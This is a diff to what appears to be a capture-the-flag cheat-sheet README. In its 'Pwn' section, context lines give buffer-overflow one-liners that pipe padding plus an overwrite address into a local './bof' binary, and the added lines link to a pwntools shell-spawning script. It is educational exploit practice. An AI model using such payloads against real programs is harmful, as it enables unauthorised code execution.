@@ -587,6 +587,11 @@ Pwn
 	* `for i in {20..28}; do echo $i; python -c "print 'A' * $i + '\xee\xba\xf3\xca'" | ./bof ; done`
 	* `(python -c "print 'A' * 24 + '\xee\xba\xf3\xca'"; cat) | ./bof`
 	
+* `Call shell using pwntools based on gets`
+	
+	* [pwntools-code](https://github.com/ByamB4/CaptureTheFlagTool/blob/master/BinaryExploitation/code/pwntools-call-shell.py)
+	
+	
 Programming
 --------------------
 
